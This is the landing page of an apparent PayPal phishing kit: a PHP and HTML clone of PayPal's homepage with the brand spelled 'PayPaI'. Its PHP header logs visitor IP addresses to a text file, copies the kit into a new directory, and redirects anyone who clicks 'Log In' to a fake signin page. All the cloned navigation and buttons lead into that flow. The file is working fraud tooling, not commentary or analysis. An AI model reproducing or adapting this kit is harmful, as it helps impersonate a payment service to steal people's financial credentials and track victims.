<?
include 'get_infos.php';

if (isset($_POST['login'])) {
recurse_copy( $src, $dst );
header("location:$dst/signin?country.x=".$cn."&locale.x=en_".$cn."");
$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");}
?> 


<!DOCTYPE html>
<html lang="en-US" class="js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage indexeddb hashchange history draganddrop rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage applicationcache svg inlinesvg smil svgclippaths jsEnabled" data-device-type="dedicated"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Send Money, Pay Online or Set Up a Merchant Account - PayPaI</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui, shrink-to-fit=no">
<link rel="stylesheet" href="./home_files/css.css" type="text/css">
<style></style></head>
    <body>        
<div id="body" class="">
<header class="table-row pp-header" role="banner">
    <div>
<div class="containerCentered ">
<a id="menu-button" role="button">Menu</a>
<a onclick='window.location.href=""' class="paypal-img-logo">PayPal</a>
<nav id="main-menu" class="main-menu" role="navigation">
    <ul>
      <li><a id="header-personal" rel="menuitem" aria-controls="submenu-personal"  aria-expanded="false">Personal</a><div class="menu-wrapper" id="submenu-personal" aria-labelledby="header-personal" role="region"><ul id="header-personal-menu" class="subnav list"><a id="header-personal" rel="menuitem" aria-controls="submenu-personal"  tabindex="-1">Personal</a>
<li><a tabindex="-1">What is PayPaI? <em>Learn how PayPaI works in your everyday life</em></a></li><li><a tabindex="-1">Check Out Securely Online <em>Use your credit cards or other funds</em></a></li><li><a tabindex="-1">PayPaI Credit &amp; Cards <em>Our credit, debit, prepaid cards &amp; PayPaI Credit</em></a></li><li><a tabindex="-1">PayPaI App <em>Transfer money and track activity with our app</em></a></li><li><a tabindex="-1">PayPaI Can Do That <em>Discover ways to manage and move your money</em></a></li><li><a tabindex="-1">Shopping and More <em>Deals, gift cards and donations</em></a></li></ul><a class="closer" role="button" title="Close" ><span class="accessAid">Close</span></a></div></li><li><a id="header-business" rel="menuitem" aria-controls="submenu-business"  aria-expanded="false">Business</a><div class="menu-wrapper" id="submenu-business" aria-labelledby="header-business" role="region"><ul id="header-business-menu" class="subnav list"><a id="header-business" rel="menuitem" aria-controls="submenu-business"  tabindex="-1">Business</a>
<li><a tabindex="-1">All Business Solutions <em>Merchant services, invoicing, and more</em></a></li><li><a tabindex="-1">Get Paid in Person <em>Mobile card readers and POS solutions</em></a></li><li><a tabindex="-1">Credit Card Processing <em>Accept credit, debit cards, and PayPaI</em></a></li><li><a tabindex="-1">Small Business Loans <em>Fast and fair financing</em></a></li><li><a  tabindex="-1">Add PayPaI to Your Checkout <em>Add the button to accept payments</em></a></li><li><a tabindex="-1">Offer Credit to Your Customers <em>Promote financing to help increase sales</em></a></li></ul><a class="closer" role="button" title="Close" ><span class="accessAid">Close</span></a></div></li><li><a onclick='window.location.href=""' id="header-send" class="no-drop">Send</a><div class="menu-wrapper" id="submenu-" aria-labelledby="header-" role="region"><ul id="header--menu" class="subnav list"><a onclick='window.location.href=""' id="header-send" class="no-drop"  tabindex="-1">Send</a>
</ul><a class="closer" role="button" title="Close"><span class="accessAid">Close</span></a></div></li><li><a onclick='window.location.href=""' id="header-request" class="no-drop" >Request</a><div class="menu-wrapper" id="submenu-" aria-labelledby="header-" role="region"><ul id="header--menu" class="subnav list"><a onclick='window.location.href=""' id="header-request" class="no-drop"  tabindex="-1">Request</a>
</ul><a class="closer" role="button" title="Close"><span class="accessAid">Close</span></a></div></li>
</ul>


<ul class="sublist">
<li><a onclick='window.location.href=""' id="signup-button-mobile" name="SignUp_header" class="btn btn-small btn-white-border signup-mobile" >Sign Up for Free</a></li>
</ul>
</nav>
<div id="header-buttons" class="header-buttons">
<form method="post">
<button id="ul-btn" class="btn btn-small btn-secondary" name="login">Log In</button>
<a onclick='window.location.href=""' id="signup-button" class="btn btn-small btn-signup">Sign Up</a>
</form>
</div>
</div>
    </div>
</header>
<div role="main" id="main" class="containerMobileFullWidth">
<section class="row-fluid hero-home center-text row cookied-hero-flip-tile dark" style="background-image: url(home_files/hero-cookied-base-2.jpg)">
  <div class="containerCentered container">
    <div class="vertical-centered">

      <h1 class="span9 center-block">
        With PayPaI, you can pay your way.
</h1>
<p class="subheadline">Add credit, debit, and bank accounts to your digital wallet and take your pick at checkout.</p>
<div class="mainContainer">
            <a onclick='window.location.href=""' class="btn span4 center-block useModal ">Learn More</a>
          </div>
<div class="hatchContainer">
  <form method="post">
  <button class=" btn btn-white-border span4 center-block" name="login">Log into Your Account</button>
</form>
        </div>
</div>
</div>
</section>
<section class="panel four-panel center-text four-tile-flip-container" id="overview">

    <div class="row-fluid">
        <header class="containerCentered center-text">
            <h2 class="pulloutHeadline">Your account is brimming with possibilities.</h2>
        </header>

        <div class="containerCentered container4d2p1m">
            <div class="panel1 flip-container span3" ontouchstart="this.classList.toggle(&#39;hover&#39;);">
                <a onclick='window.location.href=""' class="flipper">
                  <div class="front">
                        <h2 class="contentHead medium">Get Started</h2>
                        <img src="./home_files/shortlander_get_started.png">
                  </div>
                  <div class="back">
                        <h2 class="contentHead medium">Get Started</h2>
                    <p class="contentPara">We're more than just a way to pay. Explore what PayPaI has to offer. <span>Learn More</span></p>
                  </div>
                </a>
            </div>
            <div class="panel2 flip-container span3" ontouchstart="this.classList.toggle(&#39;hover&#39;);">
                <a onclick='window.location.href=""' class="flipper">
                  <div class="front">
                    <h2 class="contentHead medium">Pay Your Way</h2>
                    <img src="./home_files/shortlander_pay_your_way.png">
                  </div>
                  <div class="back">
                                <h2 class="contentHead medium">Pay Your Way</h2>
                    <p class="contentPara">Our digital wallet lets you add credit, debit and bank accounts so you decide how to pay. <span>Learn More</span></p>
                  </div>
                </a>
            </div>
            <div class="panel3 flip-container span3" ontouchstart="this.classList.toggle(&#39;hover&#39;);">
                <a onclick='window.location.href=""' class="flipper">
                  <div class="front">
                        <h2 class="contentHead medium">Purchase Protection*</h2>
                        <img src="./home_files/shortlander_purchase_protection.png">
                  </div>
                  <div class="back">
                        <h2 class="contentHead medium">Purchase Protection*</h2>
                    <p class="contentPara">If you don't receive exactly what you ordered, we’ll help you get your money back. <span>Learn More</span></p>
                  </div>
                </a>
            </div>
            <div class="panel4 flip-container span3" ontouchstart="this.classList.toggle(&#39;hover&#39;);">
                <a onclick='window.location.href=""' class="flipper">
                  <div class="front">
                        <h2 class="contentHead medium">Send Money</h2>
                        <img src="./home_files/shortlander_send_money.png">
                  </div>
                  <div class="back">
                        <h2 class="contentHead medium">Send Money</h2>
                    <p class="contentPara">With a PayPaI account email address or phone number you can send money almost anywhere in a snap. <span>Transfer Funds</span></p>
                  </div>
                </a>
            </div>
        </div>
    </div>
<footer class="containerCentered">*<a onclick='window.location.href=""'>See eligibility &amp; purchase protections limitations.</a></footer>
</section>
</div>
<footer role="contentinfo" class="global-footer">
    <div class="containerCentered containerExtend">
<ul class="footer-main secondaryLink">
<li><a>Help &amp; Contact</a></li>
<li><a>Fees</a></li>
<li><a>Security</a></li>
<li><a>Apps</a></li>
<li><a>Shop</a></li>
<li class="country-selector ">

    </li>
<li class="footer-search">                          
<a onclick='window.location.href=""'  aria-label="Search">Search</a>
</li>                
</ul>
<hr>
<ul class="footer-secondary secondaryLink">
<li><a">About</a></li>
<li><a>Blog</a></li>
<li><a>Jobs</a></li>
<li><a>Investor Relations</a></li>
<li><a>Social Innovation</a></li>
<li><a>Public Policy</a></li>
<li><a>Sitemap</a></li>
<li><a>Enterprise</a></li>
<li><a>Partners</a></li>
</ul>
<ul class="footer-tertiary copyright-section secondaryLink">
<li id="footer-copyright" class="footer-copyright">© 1999–2018 </li>
<li id="footer-privacy"><a>Privacy</a></li>
<li class="footer-legal"><a>Legal</a></li>
<li id="siteFeedback" class="">
                <a>Feedback</a>
            </li>
        </ul>
</div>
</footer>
<script src="./home_files/js.js"></script> 
<script src="./home_files/pa.js"></script>
<style type="text/css">
	a{
		cursor: pointer;
	}
</style>
</div></body></html>